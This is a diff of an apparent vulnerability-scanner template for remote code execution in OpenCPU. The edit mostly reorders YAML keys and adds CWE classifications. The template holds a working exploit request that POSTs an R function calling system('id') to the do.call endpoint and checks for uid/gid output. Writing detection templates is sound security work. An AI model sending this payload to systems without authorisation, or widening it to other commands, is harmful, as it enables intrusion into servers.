@@ -1,5 +1,4 @@
 id: opencpu-rce
-
 info:
   name: OpenCPU - Remote Code Execution
   author: wa1tf0rme
@@ -9,38 +8,35 @@ info:
   reference:
     - https://pulsesecurity.co.nz/articles/R-Shells
     - https://github.com/opencpu/opencpu/
+  classification:
+    cwe-id:
+      - CWE-78
+      - CWE-95
   metadata:
     max-request: 1
-  tags: rce,opencpu,oss,vuln
-
+  tags: opencpu,oss,rce,vuln
 http:
-  - method: POST
-    path:
-      - "{{BaseURL}}/ocpu/library/base/R/do.call/json"
-
-    body: |
+  - body: |
       what=function(x){  return(system(paste('id'), intern %3d T))}&args={}
-
+    extractors:
+      - group: 1
+        regex:
+          - \(([a-z-]+)\)
+        type: regex
     headers:
       Content-Type: application/x-www-form-urlencoded
-    max-redirects: 2
-    redirects: true
-
-    matchers-condition: and
     matchers:
-      - type: word
+      - condition: and
+        type: word
         words:
           - uid=
           - gid=
-        condition: and
-
-      - type: status
-        status:
+      - status:
           - 201
-
-    extractors:
-      - type: regex
-        group: 1
-        regex:
-          - \(([a-z-]+)\)
-
+        type: status
+    matchers-condition: and
+    max-redirects: 2
+    method: POST
+    path:
+      - '{{BaseURL}}/ocpu/library/base/R/do.call/json'
+    redirects: true
